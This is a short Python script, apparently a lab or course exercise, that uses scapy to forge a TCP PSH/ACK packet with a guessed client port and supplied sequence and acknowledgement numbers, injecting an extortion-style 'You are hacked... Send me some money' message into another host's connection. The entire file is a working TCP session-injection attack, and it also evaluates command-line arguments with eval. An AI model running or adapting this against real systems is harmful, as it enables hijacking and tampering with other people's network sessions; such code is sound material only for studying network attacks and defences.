
import struct
import sys
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
import random
scapy.config.conf.use_pcap = True




if __name__ == '__main__':
    attacker_private_ip = sys.argv[1]
    guessed_client_port = eval(sys.argv[2])
    remote_server_ip = sys.argv[3]
    remote_server_port = eval(sys.argv[4])
    seq = eval(sys.argv[5])
    ack = eval(sys.argv[6])
    packet_iface = sys.argv[7]
    sendp(IP(src = attacker_private_ip, dst = remote_server_ip) / TCP(seq = ack, ack = seq, sport = guessed_client_port, dport = remote_server_port, flags = "PA")/ "You are hacked!!!!!!!!!Send me some money!!!!!!\n", iface = packet_iface)
    print("The attacker has sent a spoofed TCP packet to the remote server!!!!")

